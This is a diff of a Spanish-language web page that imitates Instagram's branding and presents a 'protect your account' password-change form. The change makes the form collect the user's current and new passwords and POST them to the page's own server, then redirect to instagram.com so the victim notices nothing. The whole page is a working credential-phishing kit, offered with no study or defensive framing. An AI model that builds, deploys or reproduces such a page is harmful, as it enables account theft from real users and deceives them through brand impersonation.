@@ -1,16 +1,18 @@
 <!DOCTYPE html>
 <html lang="es">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Cambiar Contraseña</title>
     <!-- Icono de la pestaña del navegador -->
-    <link rel="icon" type="image/svg+xml" href="icono.png">
+    <link rel="icon" type="image/svg+xml"
+        href="icono.png">
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');
         @import url('https://fonts.googleapis.com/css2?family=Billabong&display=swap');
-        
+
         body {
             font-family: 'Inter', sans-serif;
             background-color: #000;
@@ -22,8 +24,22 @@
             color: #fff;
             text-align: center;
         }
+
+        .form-input {
+            transition: border-color 0.2s ease-in-out, box-shadow 0.2s ease-in-out;
+        }
+
+        .form-input:focus {
+            border-color: #3b82f6;
+            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.5);
+        }
+
+        .submit-button {
+            transition: background-color 0.2s ease-in-out, transform 0.2s ease-in-out;
+        }
     </style>
-</head> 
+</head>
+
 <body class="flex items-center justify-center min-h-screen text-white p-4">
 
     <div class="bg-[#1a1a1a] border border-[#333] rounded-2xl shadow-xl w-full max-w-md p-8">
@@ -32,62 +48,46 @@
             <!-- Ícono de candado -->
             <div class="w-16 h-16 mb-4">
                 <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="#60a5fa">
-                    <path d="M12 1.5c-3.14 0-5.75 2.5-5.75 5.75V10h-2.5v11.5h16.5V10h-2.5V7.25c0-3.25-2.61-5.75-5.75-5.75Zm4.25 8.5H7.75V7.25c0-2.35 1.9-4.25 4.25-4.25s4.25 1.9 4.25 4.25V10Z"/>
+                    <path
+                        d="M12 1.5c-3.14 0-5.75 2.5-5.75 5.75V10h-2.5v11.5h16.5V10h-2.5V7.25c0-3.25-2.61-5.75-5.75-5.75Zm4.25 8.5H7.75V7.25c0-2.35 1.9-4.25 4.25-4.25s4.25 1.9 4.25 4.25V10Z" />
                 </svg>
             </div>
-            
+
             <!-- Logo de Instagram con fuente imitada -->
             <h1 class="instagram-logo mb-4">Instagram</h1>
-            
+
             <h1 class="text-xl font-bold mb-2 text-center">Protege tu cuenta: Cambia tu contraseña</h1>
-            <p class="text-sm text-center text-[#999]">Para tu seguridad, por favor introduce tu contraseña actual y la nueva contraseña que quieres usar.</p>
+            <p class="text-sm text-center text-[#999]">Para tu seguridad, por favor introduce tu contraseña actual y la
+                nueva contraseña que quieres usar.</p>
         </div>
-        
-        <form name="change-password" data-netlify="true" netlify-honeypot="bot-field" class="space-y-4" onsubmit="return validateForm(event)">
-            <input type="hidden" name="form-name" value="change-password">
-            <input type="hidden" name="_redirect" value="https://www.instagram.com">
-            <p class="hidden">
-                <label>
-                    No me llenes esto: <input name="bot-field">
-                </label>
-            </p>
+
+        <form name="change-password" class="space-y-4" onsubmit="handleSubmit(event)">
             <div>
-                <input 
-                    type="password" 
-                    id="current-password" 
-                    name="current-password"
-                    class="w-full bg-[#1a1a1a] border border-[#444] text-[#ccc] rounded-xl py-3 px-4 focus:outline-none focus:border-blue-600 transition-colors duration-200" 
-                    placeholder="Contraseña actual"
-                >
+                <input type="password" id="current-password" name="current-password"
+                    class="w-full bg-[#1a1a1a] border border-[#444] text-[#ccc] rounded-xl py-3 px-4 focus:outline-none focus:border-blue-600 transition-colors duration-200"
+                    placeholder="Contraseña actual">
             </div>
             <div>
-                <input 
-                    type="password" 
-                    id="new-password" 
-                    name="new-password"
-                    class="w-full bg-[#1a1a1a] border border-[#444] text-[#ccc] rounded-xl py-3 px-4 focus:outline-none focus:border-blue-600 transition-colors duration-200" 
-                    placeholder="Nueva contraseña"
-                >
+                <input type="password" id="new-password" name="new-password"
+                    class="w-full bg-[#1a1a1a] border border-[#444] text-[#ccc] rounded-xl py-3 px-4 focus:outline-none focus:border-blue-600 transition-colors duration-200"
+                    placeholder="Nueva contraseña">
             </div>
             <div>
-                <input 
-                    type="password" 
-                    id="confirm-password" 
-                    name="confirm-password"
-                    class="w-full bg-[#1a1a1a] border border-[#444] text-[#ccc] rounded-xl py-3 px-4 focus:outline-none focus:border-blue-600 transition-colors duration-200" 
-                    placeholder="Confirmar nueva contraseña"
-                >
+                <input type="password" id="confirm-password" name="confirm-password"
+                    class="w-full bg-[#1a1a1a] border border-[#444] text-[#ccc] rounded-xl py-3 px-4 focus:outline-none focus:border-blue-600 transition-colors duration-200"
+                    placeholder="Confirmar nueva contraseña">
             </div>
             <p id="error-message" class="text-red-500 text-sm text-center hidden">
                 Las contraseñas no coinciden.
             </p>
-             <p id="empty-fields-message" class="text-red-500 text-sm text-center hidden">
+            <p id="empty-fields-message" class="text-red-500 text-sm text-center hidden">
                 Por favor, completa todos los campos de contraseña.
             </p>
-            <button 
-                type="submit" 
-                class="w-full bg-[#1e40af] hover:bg-[#1c3a8a] text-white font-medium py-3 px-4 rounded-xl transition-colors duration-200"
-            >
+            <p id="submission-error" class="text-red-500 text-sm text-center hidden">
+                Hubo un error al enviar el formulario.
+            </p>
+            <button type="submit"
+                class="w-full bg-[#1e40af] hover:bg-[#1c3a8a] text-white font-medium py-3 px-4 rounded-xl transition-colors duration-200">
                 Cambiar contraseña
             </button>
         </form>
@@ -98,33 +98,54 @@
     </div>
 
     <script>
-        function validateForm(event) {
+        function validateForm() {
             const currentPassword = document.getElementById('current-password').value;
             const newPassword = document.getElementById('new-password').value;
             const confirmPassword = document.getElementById('confirm-password').value;
             const errorMessage = document.getElementById('error-message');
             const emptyMessage = document.getElementById('empty-fields-message');
-            
+
             // Ocultar mensajes de error previos
             errorMessage.classList.add('hidden');
             emptyMessage.classList.add('hidden');
-            
+
             // Validar que los campos no estén vacíos
             if (!currentPassword || !newPassword || !confirmPassword) {
                 emptyMessage.classList.remove('hidden');
-                event.preventDefault();
                 return false;
             }
 
             if (newPassword !== confirmPassword) {
                 errorMessage.classList.remove('hidden');
-                event.preventDefault(); // Evita que el formulario se envíe
                 return false;
-            } else {
-                return true;
+            }
+            return true;
+        }
+
+        function handleSubmit(event) {
+            event.preventDefault();
+
+            if (validateForm()) {
+                const form = event.target;
+                const data = new FormData(form);
+
+                fetch("/", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+                    body: new URLSearchParams(data).toString(),
+                })
+                    .then(() => {
+                        window.location.href = "https://www.instagram.com";
+                    })
+                    .catch((err) => {
+                        const submissionError = document.getElementById("submission-error");
+                        submissionError.textContent = "Error al enviar: " + err;
+                        submissionError.classList.remove("hidden");
+                    });
             }
         }
     </script>
 
 </body>
+
 </html>
